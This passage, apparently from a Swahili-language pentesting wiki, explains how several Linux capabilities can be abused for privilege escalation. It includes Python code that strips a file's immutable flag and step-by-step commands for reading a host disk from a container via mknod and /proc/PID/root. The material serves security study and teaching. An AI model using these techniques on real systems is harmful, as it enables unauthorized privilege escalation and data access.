**Mfano kwa binary**

Ukigundua kuwa faili ni immutable na python ina capability hii, unaweza **kuondoa attribute ya immutable na kufanya faili iweze kurekebishwa:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Operesheni za `FS_IOC_GETFLAGS` na `FS_IOC_SETFLAGS` husoma na kusasisha flags za inode; `FS_IMMUTABLE_FL` ni immutable flag inayofutwa na mfano huu.<sup>[[27]](#references)</sup>

> [!TIP]
> Kumbuka kwamba kwa kawaida immutable attribute hii huwekwa na kuondolewa kwa kutumia:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huwezesha utekelezaji wa system call ya `chroot(2)`, ambayo inaweza kuruhusu escape kutoka kwenye mazingira ya `chroot(2)` kupitia vulnerabilities zinazojulikana.<sup>[[11]](#references)[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huruhusu utekelezaji wa system call ya `reboot(2)` kwa ajili ya system restarts, ikiwemo commands kama `LINUX_REBOOT_CMD_RESTART2`; pia huwezesha `kexec_load(2)` na, kuanzia Linux 3.17, `kexec_file_load(2)` kwa ajili ya kupakia crash kernels mpya au zilizosainiwa, mtawalia.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ilitenganishwa na **CAP_SYS_ADMIN** pana zaidi katika Linux 2.6.37, hasa ikitoa uwezo wa kutumia call ya `syslog(2)`. Capability hii huwezesha kuangalia kernel addresses kupitia `/proc` na interfaces zinazofanana wakati setting ya `kptr_restrict` iko kwenye 1, ambayo hudhibiti kufichuliwa kwa kernel addresses. Tangu Linux 2.6.39, default ya `kptr_restrict` ni 0, ikimaanisha kuwa kernel addresses zinafichuliwa, ingawa distributions nyingi huiweka kwenye 1 (huficha addresses isipokuwa kwa uid 0) au 2 (huficha addresses kila wakati) kwa sababu za security.<sup>[[14]](#references)</sup>

Zaidi ya hayo, **CAP_SYSLOG** huruhusu kufikia output ya `dmesg` wakati `dmesg_restrict` imewekwa kwenye 1. Licha ya mabadiliko haya, **CAP_SYS_ADMIN** bado ina uwezo wa kufanya operations za `syslog` kutokana na precedents za kihistoria.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huongeza functionality ya system call ya `mknod` zaidi ya kuunda regular files, FIFOs (named pipes), au UNIX domain sockets. Hasa huruhusu kuundwa kwa special files, ambazo zinajumuisha:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, ambazo ni devices kama terminals.
- **S_IFBLK**: Block special files, ambazo ni devices kama disks.

Capability hii ni muhimu kwa processes zinazohitaji kuunda device files, ikiwemo character au block devices.<sup>[[14]](#references)</sup>

Imejumuishwa katika documented default capability set ya Docker; thibitisha runtime configuration halisi badala ya kudhani kwamba kila deployment hutumia defaults zilezile ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Capability hii inaruhusu kufanya privilege escalations (kupitia full disk read) kwenye host, chini ya masharti haya:<sup>[[7]](#references)</sup>

1. Uwe na initial access kwenye host (Unprivileged).
2. Uwe na initial access kwenye container (Privileged (EUID 0), na effective `CAP_MKNOD`).
3. Host na container zinapaswa kushiriki user namespace ileile.

**Hatua za Kuunda na Kufikia Block Device katika Container:**

1. **Kwenye Host kama Standard User:**

- Tambua user ID yako ya sasa kwa `id`, kwa mfano, `uid=1000(standarduser)`.
- Tambua target device, kwa mfano, `/dev/sdb`.

2. **Ndani ya Container kama `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Rudi kwenye Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Mbinu hii humruhusu mtumiaji wa kawaida kufikia na, ikiwezekana, kusoma data kutoka `/dev/sdb` kupitia container wakati kifaa, namespaces na permissions vimewekwa kama ilivyoelezwa.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Kwenye Linux kernels za sasa zilizo na file capabilities, **`CAP_SETPCAP`** huruhusu thread kuongeza capabilities kutoka kwenye bounding set yake hadi kwenye inheritable set yake, kuondoa capabilities kutoka kwenye bounding set yake, na kubadilisha securebits zake. Hairuhusu process kumpa process nyingine capabilities kiholela; tabia hiyo ilitumika tu kwenye kernels za kabla ya 2.6.25 ambazo hazikuwa na file-capability support.<sup>[[14]](#references)</sup>

System call ya `capset()` inaweza kurekebisha sets za thread yenyewe za effective, permitted na inheritable, lakini permitted set mpya haiwezi kuwa na capabilities zilizo nje ya permitted set iliyopo, na mabadiliko ya inheritable yanaendelea kutegemea vikwazo vya kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Maabara za privilege escalation za Linux](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation kwenye Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Misingi ya Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Kutumia Faida ya Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities Zilizopitiliza](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Kutumia Vibaya Ufikiaji wa Mount Namespaces kupitia /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Kwa Nini Zipo na Jinsi Zinavyofanya Kazi](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Kuelewa Capabilities kwenye Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC ya Kupita seccomp ikiwa ptrace Inaruhusiwa](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Jinsi ya Kutoka kwenye Suluhisho Mbalimbali za chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Exploit ya awali ya Docker breakout ya CAP_DAC_READ_SEARCH iliyoandikwa na Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Uchambuzi wa Docker breakout exploit](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ukurasa wa mwongozo wa Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Kuendesha containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
